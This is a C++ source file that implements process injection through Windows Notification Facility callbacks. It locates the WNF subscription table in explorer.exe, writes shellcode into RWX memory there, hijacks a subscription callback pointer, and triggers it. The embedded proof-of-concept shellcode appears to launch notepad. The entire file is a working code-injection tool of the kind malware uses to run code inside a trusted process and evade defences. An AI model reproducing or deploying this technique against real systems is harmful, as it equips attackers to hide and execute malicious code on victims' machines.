
#include "wnfcallback.h"
#include <Windows.h>
#include "ntStructs.h"
#include "utils.h"
#include <iostream>

// #include "ntlib_modexp/util.h"


#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

#define WNF_SHEL_LOGON_COMPLETE            0xd83063ea3bc1875

NTSYSCALLAPI NTSTATUS NTAPI NtSetWnfProcessNotificationEvent(
    _In_ HANDLE NotificationEvent
);


LPVOID GetUserSubFromTable(
    HANDLE                 hp,
    LPVOID                 addr,
    PWNF_USER_SUBSCRIPTION us,
    ULONG64                sn)
{
    BOOL                   bRead;
    SIZE_T                 rd;
    LIST_ENTRY             stle, nsle, * nte, * use;
    WNF_NAME_SUBSCRIPTION  ns;
    PBYTE                  p;
    ULONG64                x;
    LPVOID                 sa = NULL;

    // read NamesTableEntry into local memory
    ReadProcessMemory(
        hp,
        (PBYTE)addr + offsetof(WNF_SUBSCRIPTION_TABLE, NamesTableEntry),
        &stle, sizeof(stle), &rd);

    // for each name subscription
    nte = stle.Flink;
    for (;;) {
        // read WNF_NAME_SUBSCRIPTION into local memory    
        p = (PBYTE)nte - offsetof(WNF_NAME_SUBSCRIPTION, NamesTableEntry);
        bRead = ReadProcessMemory(
            hp, (PBYTE)p, &ns, sizeof(ns), &rd);
        if (!bRead) break;

        x = *(ULONG64*)&ns.StateName;
        // is it our user subcription?
        if (x == sn) {
            // read first entry and exit loop
            use = ns.SubscriptionsListHead.Flink;
            // read WNF_USER_SUBSCRIPTION into local memory
            sa = (PBYTE)use - offsetof(WNF_USER_SUBSCRIPTION, SubscriptionsListEntry);
            ReadProcessMemory(
                hp, (PBYTE)sa, us, sizeof(WNF_USER_SUBSCRIPTION), &rd);
            break;
        }
        // last one? break from loop
        if (nte == stle.Blink) break;

        // read LIST_ENTRY
        bRead = ReadProcessMemory(
            hp, (PBYTE)nte, &nsle, sizeof(nsle), &rd);
        if (!bRead) break;

        nte = nsle.Flink;
    }
    return sa;
}

// try find the subscription table by header
// returns TRUE if found, else FALSE
LPVOID FindWnfSubTable(
    HANDLE                    hp,
    PMEMORY_BASIC_INFORMATION mbi,
    PWNF_USER_SUBSCRIPTION    us,
    ULONG64                   sn)
{
    SIZE_T                 pos;
    SIZE_T                 rd;
    WNF_SUBSCRIPTION_TABLE st;
    LPVOID                 sa = NULL;

    for (pos = 0;
        pos < (mbi->RegionSize - sizeof(WNF_SUBSCRIPTION_TABLE));
        pos++)
    {
        // try read size of table
        ReadProcessMemory(
            hp, (PBYTE)mbi->BaseAddress + pos, &st,
            sizeof(WNF_SUBSCRIPTION_TABLE), &rd);

        if (rd != sizeof(WNF_SUBSCRIPTION_TABLE)) break;

        // found WNF table?
        if (st.Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE &&
            st.Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) {
            // read user subscription for state name
            sa = GetUserSubFromTable(hp, (PBYTE)mbi->BaseAddress + pos, us, sn);
            break;
        }
    }
    return sa;
}

// this method searches all writeable areas of memory for the WNF table
// much slower than version searching data segment
LPVOID GetUserSubFromProcessOld(
    HANDLE hp, PWNF_USER_SUBSCRIPTION us, ULONG64 sn)
{
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;
    SIZE_T                   res;
    LPVOID                   sa = NULL;

    GetSystemInfo(&si);

    for (addr = 0;
        addr < (LPBYTE)si.lpMaximumApplicationAddress;
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize)
    {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hp, addr, &mbi, sizeof(mbi));
        if (res != sizeof(mbi)) break;

        // heap memory? (can be stack too)
        if ((mbi.State == MEM_COMMIT) &&
            (mbi.Type == MEM_PRIVATE) &&
            (mbi.Protect == PAGE_READWRITE))
        {
            // try find user sub in this block
            sa = FindWnfSubTable(hp, &mbi, us, sn);
            if (sa != NULL) break;
        }
    }
    return sa;
}

LPVOID GetUserSubFromProcess(HANDLE hp, DWORD pid, PWNF_USER_SUBSCRIPTION us, ULONG64 sn)
{
    LPVOID                   m, rm, va = NULL, sa = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, cnt;
    PULONG_PTR               ds;
    ULONG_PTR                ptr;
    MEMORY_BASIC_INFORMATION mbi;
    PWNF_SUBSCRIPTION_TABLE  tbl;
    SIZE_T                   rd;
    WNF_SUBSCRIPTION_TABLE   st;

    // Storage Protection Windows Runtime automatically subscribes to WNF. 
    // Loading efswrt.dll will create the table if not already initialized.
    // Search the data segment of NTDLL and obtain the Relative Virtual Address of WNF table
    // Read the base address of NTDLL from remote process and add to RVA
    // Read pointer to heap in remote process.
    // Finally, read a user subscription
    LoadLibraryW(L"efswrt.dll");

    // load local copy
    m = LoadLibraryW(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;
    nt = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);
    sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
        nt->FileHeader.SizeOfOptionalHeader);

    // locate the .data segment, save VA and number of pointers
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (*(PDWORD)sh[i].Name == *(PDWORD)".data") {
            ds = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
            cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
            break;
        }
    }
    // for each pointer
    for (i = 0; i < cnt; i++) {
        if (!IsHeapPtr((LPVOID)ds[i])) continue;

        tbl = (PWNF_SUBSCRIPTION_TABLE)ds[i];
        // if it looks like subscription table resides here
        if (tbl->Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE &&
            tbl->Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE))
        {
            // save the virtual address
            va = (PBYTE)&ds[i];
            break;
        }
    }
    if (va != NULL) {
        ReadProcessMemory(hp, va, &ptr, sizeof(ULONG_PTR), &rd);
        // read a user subscription from remote
        sa = GetUserSubFromTable(hp, (LPVOID)ptr, us, sn);
    }
    return sa;
}

VOID wnf_inject(LPVOID payload, DWORD payloadSize) 
{
    WNF_USER_SUBSCRIPTION  us;
    LPVOID                 sa, cs;
    HWND                   hw;
    HANDLE                 hp;
    DWORD                  pid;
    SIZE_T                 wr;
    ULONG64                ns = WNF_SHEL_LOGON_COMPLETE;
    HMODULE                m;

    // 1. Open explorer.exe
    hw = FindWindowW(L"Shell_TrayWnd", NULL);
    GetWindowThreadProcessId(hw, &pid);

    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);



    // 2. Locate user subscription
    sa = GetUserSubFromProcess(hp, pid, &us, WNF_SHEL_LOGON_COMPLETE);

    // 3. Allocate RWX memory and write payload
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

    printf("wpm shellcode to %p\nprocname:%s", cs, GetNameByPid1(pid));

    // 4. Update callback and trigger execution of payload
    WriteProcessMemory(
        hp,
        (PBYTE)sa + offsetof(WNF_USER_SUBSCRIPTION, Callback),
        &cs,
        sizeof(ULONG_PTR),
        &wr);

    // getchar();
    Sleep(4 * 1000);

    NtUpdateWnfStateData(
        &ns, 
        NULL, 
        0, 
        0, 
        NULL, 
        0, 
        0
    );

    Sleep(4*1000);

    // 5. Restore original callback, free memory and close process
    WriteProcessMemory(
        hp,
        (PBYTE)sa + offsetof(WNF_USER_SUBSCRIPTION, Callback),
        &us.Callback,
        sizeof(ULONG_PTR),
        &wr);

    VirtualFreeEx(hp, cs, 0, MEM_RELEASE);
    CloseHandle(hp);
}

int wnfcallbackExecute() 
{
    unsigned char shellcode2[344] = {
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x48, 0xD8, 0xC7, 0x40, 0xD8, 0x57, 0x69,
    0x6E, 0x45, 0xC7, 0x40, 0xDC, 0x78, 0x65, 0x63, 0x00, 0xC7, 0x40, 0xE0, 0x6E, 0x6F, 0x74, 0x65,
    0xC7, 0x40, 0xE4, 0x70, 0x61, 0x64, 0x00, 0xE8, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
    0x0C, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x33, 0xC0, 0x48,
    0x83, 0xC4, 0x48, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
    0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC,
    0x20, 0x48, 0x63, 0x41, 0x3C, 0x48, 0x8B, 0xD9, 0x4C, 0x8B, 0xE2, 0x8B, 0x8C, 0x08, 0x88, 0x00,
    0x00, 0x00, 0x85, 0xC9, 0x74, 0x37, 0x48, 0x8D, 0x04, 0x0B, 0x8B, 0x78, 0x18, 0x85, 0xFF, 0x74,
    0x2C, 0x8B, 0x70, 0x1C, 0x44, 0x8B, 0x70, 0x20, 0x48, 0x03, 0xF3, 0x8B, 0x68, 0x24, 0x4C, 0x03,
    0xF3, 0x48, 0x03, 0xEB, 0xFF, 0xCF, 0x49, 0x8B, 0xCC, 0x41, 0x8B, 0x14, 0xBE, 0x48, 0x03, 0xD3,
    0xE8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x25, 0x85, 0xFF, 0x75, 0xE7, 0x33, 0xC0, 0x48,
    0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B,
    0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0xC3, 0x0F, 0xB7,
    0x44, 0x7D, 0x00, 0x8B, 0x04, 0x86, 0x48, 0x03, 0xC3, 0xEB, 0xD4, 0xCC, 0x48, 0x89, 0x5C, 0x24,
    0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0xF9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x8B, 0x5A, 0x10, 0xEB, 0x16, 0x4D,
    0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xE8, 0x35, 0xFF, 0xFF, 0xFF, 0x48,
    0x8B, 0x1B, 0x4C, 0x8B, 0xC0, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x85, 0xC0, 0x75, 0xE1, 0x48, 0x8B,
    0x5C, 0x24, 0x30, 0x49, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8A, 0x01, 0x45,
    0x84, 0xC0, 0x74, 0x1A, 0x41, 0x8A, 0xC0, 0x48, 0x2B, 0xCA, 0x44, 0x8A, 0xC0, 0x3A, 0x02, 0x75,
    0x0D, 0x48, 0xFF, 0xC2, 0x8A, 0x04, 0x11, 0x44, 0x8A, 0xC0, 0x84, 0xC0, 0x75, 0xEC, 0x0F, 0xB6,
    0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3
    };

    wnf_inject(shellcode2, sizeof(shellcode2));
    return 0;
}
